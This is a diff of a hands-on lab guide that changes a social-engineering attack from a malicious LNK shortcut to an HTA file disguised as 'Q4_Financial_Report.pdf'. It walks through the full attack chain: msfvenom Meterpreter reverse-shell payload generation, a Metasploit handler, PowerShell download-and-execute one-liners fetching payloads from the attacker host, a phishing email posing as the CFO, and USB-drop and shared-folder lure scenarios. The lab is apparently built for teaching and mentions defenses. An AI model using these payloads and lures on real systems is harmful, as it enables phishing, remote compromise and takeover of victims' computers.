@@ -1,20 +1,20 @@
 # How to Use the Lab
 
-**LNK Exploit - Social Engineering Attack Guide**
+**HTA Exploit - Social Engineering Attack Guide**
 
 ---
 
 ## Quick Start (Recommended)
 
-The LNK exploit files are **already generated** after setup!
+The HTA exploit files are **already generated** after setup!
 
 ### Step 1: Start the attack on Kali
 
 ```bash
 cd vagrant
 vagrant ssh kali
-cd /vagrant/exploits/lnk
-./start_lnk_attack.sh
+cd /vagrant/exploits/hta
+./start_hta_attack.sh
 ```
 
 This automatically:
@@ -28,19 +28,19 @@ This automatically:
 
 **Method A: Desktop Shortcut (Easiest)** ⭐ **RECOMMENDED**
 1. In Windows VM, look at the desktop
-2. Double-click: `Download_Fake_PDF_from_Kali`
-3. This downloads the LNK file from Kali HTTP server automatically
+2. Double-click: `Download_Exploit_from_Kali`
+3. This downloads the HTA file from Kali HTTP server automatically
 4. When download completes, double-click `Q4_Financial_Report.pdf`
 
 **Method B: Manual Placement**
-1. In Windows VM, navigate to: `C:\vagrant\exploits\lnk\`
-2. Copy `Q4_Financial_Report.pdf.lnk` to Desktop
+1. In Windows VM, navigate to: `C:\vagrant\exploits\hta\`
+2. Copy `Q4_Financial_Report_EXE.pdf.hta` to Desktop
 3. Double-click the "PDF" file
 
 **Method C: HTTP Download (Most Realistic)**
 1. In Windows VM, open browser
 2. Go to: `http://192.168.56.101:8080/`
-3. Download `Q4_Financial_Report.pdf.lnk`
+3. Download `Q4_Financial_Report_EXE.pdf.hta`
 4. Save to Desktop and double-click
 
 ### Step 3: Get Meterpreter Session!
@@ -75,40 +75,40 @@ Desktop
 
 ```
 1. Victim double-clicks "PDF"
-2. Windows executes the LNK shortcut
-3. LNK runs: powershell.exe -w hidden -ep bypass
-4. PowerShell downloads: http://192.168.56.101:8080/shell.ps1
-5. PowerShell executes payload in memory
-6. Meterpreter connects back to Kali:4444
+2. Windows executes the HTA file via mshta.exe
+3. VBScript downloads: http://192.168.56.101:8080/update.exe
+4. VBScript executes the downloaded EXE
+5. Meterpreter EXE connects back to Kali:4444
+6. Attacker gets remote access
 ```
 
 **Key Techniques:**
-- Social engineering (fake PDF)
-- Hidden PowerShell window (`-w hidden`)
-- Fileless execution (runs in memory)
-- No disk writes (IEX download string)
+- Social engineering (fake PDF icon)
+- Silent execution (hidden windows)
+- Executable payload (reliable on all Windows versions)
+- Auto-execute on download
 
 ---
 
 ## Available Scripts
 
-### LNK Exploit Scripts
+### HTA Exploit Scripts
 
 | Script | Location | Purpose |
 |--------|----------|---------|
-| `start_lnk_attack.sh` | `/vagrant/exploits/lnk/` | Main attack automation |
-| `shell.ps1` | `/vagrant/exploits/lnk/` | PowerShell Meterpreter payload |
-| `Q4_Financial_Report.pdf.lnk` | `/vagrant/exploits/lnk/` | Malicious LNK shortcut |
+| `start_hta_attack.sh` | `/vagrant/exploits/hta/` | Main attack automation |
+| `update.exe` | `/vagrant/exploits/hta/` | Meterpreter EXE payload |
+| `Q4_Financial_Report_EXE.pdf.hta` | `/vagrant/exploits/hta/` | Malicious HTA file |
 
 ### Attack Automation
 
-**start_lnk_attack.sh does:**
+**start_hta_attack.sh does:**
 1. Pre-flight checks (files exist, ports available, connectivity)
 2. Starts Python HTTP server (port 8080)
 3. Creates Metasploit resource script
 4. Starts Meterpreter handler (port 4444)
 5. Displays delivery instructions
-6. Waits for victim to click
+6. Waits for victim to execute
 
 ---
 
@@ -175,8 +175,8 @@ meterpreter > shell
 C:\> cd C:\Users\vagrant\Desktop
 
 # Create proof file
-C:\> echo HACKED_VIA_LNK > HACKED_BY_YourName.txt
-C:\> echo Attack: Malicious LNK Shortcut >> HACKED_BY_YourName.txt
+C:\> echo HACKED_VIA_HTA > HACKED_BY_YourName.txt
+C:\> echo Attack: Malicious HTA File >> HACKED_BY_YourName.txt
 C:\> echo Date: %DATE% %TIME% >> HACKED_BY_YourName.txt
 
 # Exit shell
@@ -207,11 +207,11 @@ set ExitOnSession false
 exploit -j
 
 # Start HTTP server in another terminal
-cd /home/vagrant/lnk_payloads
+cd /home/vagrant/hta_payloads
 python3 -m http.server 8080 --bind 192.168.56.101
 ```
 
-### Regenerate LNK Exploit
+### Regenerate HTA Exploit
 
 If you need to regenerate the exploit files:
 
@@ -221,12 +221,12 @@ vagrant ssh kali
 
 # Run provisioning script
 cd /vagrant/vagrant/provisioning/kali
-./create_lnk_exploit.sh
+./create_hta_exploit.sh
 ```
 
 ### Custom Payload
 
-Generate custom PowerShell payload:
+Generate custom EXE payload:
 
 ```bash
 # On Kali
@@ -235,8 +235,8 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp \
     LPORT=4444 \
     -a x64 \
     --platform windows \
-    -f psh \
-    -o /vagrant/exploits/lnk/custom_payload.ps1
+    -f exe \
+    -o /vagrant/exploits/hta/custom_payload.exe
 ```
 
 ---
@@ -247,7 +247,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp \
 
 **Setup:**
 1. Start attack script on Kali
-2. Host LNK file on HTTP server
+2. Host HTA file on HTTP server
 3. Craft phishing email
 
 **Email Template:**
@@ -259,7 +259,7 @@ Dear Team,
 Please review the attached Q4 financial report before
 tomorrow's board meeting.
 
-Download: http://192.168.56.101:8080/Q4_Financial_Report.pdf.lnk
+Download: http://192.168.56.101:8080/Q4_Financial_Report_EXE.pdf.hta
 
 Best regards,
 CFO
@@ -275,7 +275,7 @@ CFO
 ### Scenario 2: USB Drop Attack
 
 **Setup:**
-1. Copy LNK file to USB drive
+1. Copy HTA file to USB drive
 2. Label USB: "Executive Salaries 2024"
 3. Leave in company parking lot
 
@@ -283,14 +283,14 @@ CFO
 1. Finds USB drive
 2. Plugs into computer
 3. Opens USB to see contents
-4. Double-clicks "Executive_Salaries_2024.pdf.lnk"
+4. Double-clicks "Executive_Salaries_2024.pdf.hta"
 5. Gets exploited
 
 ### Scenario 3: Shared Network Folder
 
 **Setup:**
-1. Place LNK file in shared network folder
-2. Name: "Company_Policy_Update.pdf.lnk"
+1. Place HTA file in shared network folder
+2. Name: "Company_Policy_Update.pdf.hta"
 
 **Victim Actions:**
 1. Browses shared folder
@@ -302,7 +302,7 @@ CFO
 
 ## Troubleshooting
 
-### LNK File Doesn't Execute
+### HTA File Doesn't Execute
 
 **Check:**
 1. Verify Windows can reach Kali:
@@ -312,12 +312,13 @@ CFO
 
 2. Test HTTP server:
    ```powershell
-   Invoke-WebRequest http://192.168.56.101:8080/shell.ps1
+   Invoke-WebRequest http://192.168.56.101:8080/update.exe
    ```
 
-3. Test PowerShell command manually:
+3. Test download manually:
    ```powershell
-   powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.56.101:8080/shell.ps1')"
+   (New-Object Net.WebClient).DownloadFile('http://192.168.56.101:8080/update.exe', 'C:\temp\update.exe')
+   Start-Process C:\temp\update.exe
    ```
 
 ### No Meterpreter Session
@@ -404,7 +405,7 @@ Removes all VMs and frees disk space.
 
 ### For Learning
 
-1. **Understand before executing** - Read LNK_EXPLOIT_GUIDE.md first
+1. **Understand before executing** - Read exploits/hta/README.md first
 2. **Try different delivery methods** - Practice all scenarios
 3. **Document your findings** - Take notes, screenshots
 4. **Practice defenses** - Learn how to detect and prevent
@@ -412,15 +413,15 @@ Removes all VMs and frees disk space.
 
 ### For Teaching
 
-1. **Demonstrate deception** - Show PDF icon vs actual LNK file
+1. **Demonstrate deception** - Show PDF icon vs actual HTA file
 2. **Explain social engineering** - Why victims fall for it
 3. **Show network traffic** - Wireshark capture of payload download
-4. **Teach defenses** - File extension visibility, PowerShell logging
+4. **Teach defenses** - File extension visibility, HTA application blocking
 5. **Discuss ethics** - Real-world implications
 
 ### For Security Awareness
 
-1. **Show file extensions** - Windows hides .lnk by default
+1. **Show file extensions** - Windows hides .hta extension
 2. **Verify sources** - Don't trust unexpected files
 3. **Question urgency** - "URGENT" emails are often phishing
 4. **Check URLs** - Hover before clicking links
@@ -441,14 +442,14 @@ Removes all VMs and frees disk space.
 ## Additional Resources
 
 **Documentation:**
-- [LNK_EXPLOIT_GUIDE.md](LNK_EXPLOIT_GUIDE.md) - Complete technical details
+- [exploits/hta/README.md](exploits/hta/README.md) - Complete technical details
 - [TROUBLESHOOTING.md](TROUBLESHOOTING.md) - Common issues
-- [docs/LEARNING_OBJECTIVES.md](docs/LEARNING_OBJECTIVES.md) - Educational goals
+- [README.md](README.md) - Main lab documentation
 
 **External Resources:**
 - [Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
 - [MITRE ATT&CK T1204.002](https://attack.mitre.org/techniques/T1204/002/)
-- [PowerShell Attack Techniques](https://attack.mitre.org/techniques/T1059/001/)
+- [HTA Attack Techniques](https://attack.mitre.org/techniques/T1218/005/)
 
 ---
 
@@ -456,5 +457,5 @@ Removes all VMs and frees disk space.
 
 ---
 
-*Last Updated: 2026-01-09*
-*Version: 2.0 - LNK Exploit Lab*
+*Last Updated: 2026-01-10*
+*Version: 2.0 - HTA Exploit Lab*
